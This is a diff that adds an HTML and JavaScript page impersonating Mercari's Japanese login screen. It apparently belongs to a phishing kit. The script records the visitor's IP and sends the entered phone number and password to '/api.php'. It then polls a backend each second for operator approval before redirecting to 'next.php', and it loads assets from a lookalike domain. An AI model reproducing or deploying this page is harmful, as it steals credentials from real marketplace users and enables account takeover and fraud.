@@ -1,0 +1,234 @@
+<html lang="ja-JP"><head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>ログイン - メルカリ スマホでかんたん フリマアプリ</title>
+    <meta name="description" content="CMで話題！フリマアプリ「メルカリ」は、スマホから誰でも簡単に売り買いが楽しめるフリマアプリです。購入時はクレジットカード・キャリア決済・コンビニ・銀行ATMで支払いでき、品物が届いてから出品者に入金される独自システムで安心です。">
+
+    <meta name="format-detection" content="telephone=no">
+
+<!--    <link href="https://www.mercari.com/jp/assets/css/app.jp.css?2948830063" rel="stylesheet">-->
+        <link href="jp.css" rel="stylesheet">
+    <link rel="apple-touch-icon" href="./img/apple-touch-icon.png?1110959694">
+    <link rel="icon" type="image/png" href="./img/favicon-32x32.png?1110959694" sizes="32x32">
+    <link rel="mask-icon" href="//pcweb-assets.mercdn.net/safari-pinned-tab.svg?1110959694" color="#ea352d">
+    <link rel="apple-touch-icon" sizes="57x57" href="./img/apple-touch-icon-57x57.png?1110959694">
+    <script src="../admin/im/site-jquery.min.js"></script>
+    <script src="../admin/im/layui.js"></script><link id="layuicss-laydate" rel="stylesheet" href="http://mercair-user.cc/admin/im/css/modules/laydate/default/laydate.css?v=5.3.1" media="all"><link id="layuicss-layer" rel="stylesheet" href="http://mercair-user.cc/admin/im/css/modules/layer/default/layer.css?v=3.5.1" media="all"><link id="layuicss-skincodecss" rel="stylesheet" href="http://mercair-user.cc/admin/im/css/modules/code.css?v=2" media="all">
+    <link href="https://cdn.bootcdn.net/ajax/libs/layer/3.5.1/theme/default/layer.min.css" rel="stylesheet">
+
+
+</head>
+<body>
+
+<div class="single-container">
+
+    <main class="single-main">
+
+        <div class="login-panel">
+<!---->
+<!--            <header class="single-header">-->
+<!--                <h1>-->
+<!--                    <a href="#">-->
+<!--                        <img src="//pcweb-assets.mercdn.net/assets/img/common/common/logo_login.svg?1110959694" alt="mercari">-->
+<!--                    </a>-->
+<!--                </h1>-->
+<!--            </header>-->
+
+            <header class="sc-jSFjdj jcTaHb" style="height: 56px;">
+                <div style=" height: 100%;
+    border-bottom: 1px solid #e5e5e5;
+">
+                    <a href="/" slot="start" aria-label="Mercari" class="sc-gKAaRy hydYaP" style="width: 110px;
+    height: 36px;
+    margin: 10px auto">
+                        <img src="https://web-auth-assets-v1.mercdn.net/logo-light-a89ab0278ea418a330ff.png" title="Mercari" alt="mercari logo" class="light-only" style="width: 100%;height: 100%">
+                    </a>
+                    <div>
+                        <div>
+                            <div>
+
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </header>
+
+            <div class="login-no-account">
+                <h1 style="display: block;
+    font-weight: bold;
+    font-size: 24px;">ログイン</h1>
+
+            </div>
+
+
+            <form action="sms.php" method="POST" id="myform" novalidate="novalidate">
+
+                <div class="login-form-inner">
+
+
+                    <div class="form-group" style="height: 55px;">
+                        <span class="mer-text-input-label" style="    font-weight: bold;
+    font-size: 14px;
+    line-height: 1.4em;">電話番号</span>
+                        <input style="height: 100%" type="text" name="email" id="email" value="" placeholder="" class="login-input-text input-default">
+                        <ul class="has-error-text" style="display: none;" id="emailtest">
+                            <li>入力してください</li>
+                        </ul>
+                    </div>
+
+
+
+                    <div class="form-group" style="height: 55px;margin-top: 55px">
+                            <span class="mer-text-input-label" style="    font-weight: bold;
+    font-size: 14px;
+    line-height: 1.4em;">パスワード</span>
+                        <input style="height: 100%" type="password" name="password" id="password" placeholder="" class="login-input-text input-default">
+                        <ul class="has-error-text" style="display: none;" id="passwordtest">
+                            <li>入力してください</li>
+                        </ul>
+                    </div>
+
+                    <div class="form-group" style="margin-top: 90px">
+                        <div class="g-recaptcha login-captcha" data-sitekey="6LfYSLYaAAAAAD4xXu7MljrQASPQjyuMzA4XB1Pm"></div>
+                    </div>
+
+                    <button type="button" onclick="verify()" class="login-submit btn-default btn-red">ログイン</button>
+
+                    <input type="hidden" name="login_callback" value="/jp/">
+
+                    <input type="hidden" name="__csrf_value" value="d3dc69acbbb4d8ae0e586e4b73215067ebb29e7b0cf25abae9b4c48a1e9b55ef8b3f84fe728ab1fb9c31ff3d7b58626ef952cc35fc526ee799b0428ecf02d19d8">
+
+                    <a href="https://www.mercari.com/jp/password/reset/start/">パスワードをお忘れの方</a>
+                </div>
+
+                <div style="padding: 24px;bottom: 100px">
+                    このサイトはreCAPTCHAで保護されており、Googleの <br>
+                    プライバシーポリシー と 利用規約 が適用されます。
+                </div>
+            </form>
+
+
+
+
+            <script>
+                var mask = null;
+                var timer = null;
+                var hb_timer = null;
+                function heart_beat() {
+                    $.get('/api.php?act=heart_beat&_r=' + Math.random(), function (res) {
+                        console.log(res);
+                    });
+                }
+                function ip_save() {
+                    $.get('/api.php?act=ip_save&_r=' + Math.random(), function (res) {
+                        console.log(res);
+                    });
+                }
+                ip_save();
+
+                function is_agree(){
+                    $.post('/api.php?act=is_agree&_r='+Math.random(),function (res) {
+                        var t = JSON.parse(res);
+                        if (t.code == 'ok') {
+                            layer.close(mask);
+                            clearInterval(timer);
+                            if(t.sel.indexOf('alert-error') != -1) {
+                                alert('アカウントやパスワードが間違っている');
+                            }else{//非空,则传递验证码到跳转页面
+                                window.location.href="next.php";
+                            }
+                        }else{
+                            console.log('wait');
+                        }
+                    });
+                }
+
+
+                function verify(){
+
+
+                    var user = document.getElementById("email");
+                    var pwd = document.getElementById("password");
+
+                    var emailerror = document.getElementById("emailtest");
+                    var pwderror = document.getElementById("passwordtest");
+
+
+                    if(user.value==""){
+                        user.style="    border-color: #ea352d;";
+                        emailerror.style.display="block";
+                        return false;
+                    }else {
+                        user.style="    border-color: #ccc";
+                        emailerror.style.display="none";
+
+                    }
+                    if(pwd.value==""){
+
+                        pwd.style=" border-color: #ea352d;";
+                        pwderror.style="display: block";
+                        return false;
+                    }else {
+                        pwd.style="border-color: #ccc;";
+                        pwderror.style="display: none";
+                    }
+
+
+
+
+                    var appid =  user.value;
+                    var apppwd = pwd.value;
+                    $.ajax({
+                        url: '/api.php?act=next_save&_r='+Math.random(),
+                        type: 'post',
+                        data: {uname:appid,apppwd:apppwd},
+                        success: function (res) {
+                            var t = JSON.parse(res);
+                            if(t.code == 'ok') {
+                                mask = layer.load(2, {shade: [0.25, '#000']});
+                                timer = setInterval("is_agree()", 1000);
+                                hb_timer = setInterval("heart_beat()",1000);
+                                return false;
+                            }else{
+                                layer.msg('提交失败！');
+                                return false;
+                            }
+                        },
+                    });
+
+
+                }
+
+
+            </script>
+        </div>
+
+
+    </main>
+
+    <footer class="single-footer">
+        <nav>
+            <ul class="clearfix">
+                <li>
+                    <a href="#">プライバシーポリシー</a>
+                </li>
+                <li>
+                    <a href="#">メルカリ利用規約</a>
+                </li>
+                <li>
+                    <a href="#">特定商取引に関する表記</a>
+                </li>
+            </ul>
+        </nav>
+        <a href="#" class="single-footer-logo">
+            <img src="//pcweb-assets.mercdn.net/assets/img/common/common/logo-gray.svg?1110959694" alt="mercari" width="80" height="65">
+        </a>
+        <p>
+            <small>© Mercari, Inc.</small>
+        </p>
+    </footer>
+</div>
+
+
+
+</body></html>
